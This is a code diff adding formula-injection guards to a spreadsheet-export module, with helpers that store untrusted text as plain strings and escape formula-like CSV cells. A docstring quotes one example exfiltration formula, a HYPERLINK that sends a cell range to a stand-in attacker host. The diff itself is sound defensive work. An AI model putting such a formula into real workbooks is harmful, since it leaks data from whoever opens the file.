@@ -53,6 +53,39 @@ def cell_value(raw: str) -> Any:
     return raw
 
 
+_FORMULA_START = ("=", "@", "\t", "\r")
+
+
+def is_formula_like(text: str) -> bool:
+    """True for text a spreadsheet would run as a formula (=, @, +X, -X)."""
+
+    value = str(text or "")
+    if value.startswith(_FORMULA_START):
+        return True
+    return value[:1] in {"+", "-"} and not _NUMBER.match(value.replace(" ", "")) and len(value) > 1
+
+
+def set_untrusted_cell(cell: Any, raw: Any) -> None:
+    """Write a value that came from email, documents or a model into an Excel cell.
+
+    Numbers stay numbers, but text is always stored as text, never as a formula:
+    a value like =HYPERLINK("https://evil/?d="&A1:A50) from an email must not run
+    when the workbook is opened in Excel.
+    """
+
+    value = cell_value(raw) if isinstance(raw, str) and not is_formula_like(raw) else raw
+    cell.value = value
+    if isinstance(value, str) and value:
+        cell.data_type = "s"
+
+
+def csv_safe(text: Any) -> str:
+    """A CSV cell that spreadsheet apps will not run as a formula."""
+
+    value = "" if text is None else str(text)
+    return f"'{value}" if is_formula_like(value) else value
+
+
 def markdown_tables(markdown: str) -> list[tuple[str, list[list[str]]]]:
     """(sheet name, rows) for every Markdown table, named after the heading above it."""
 
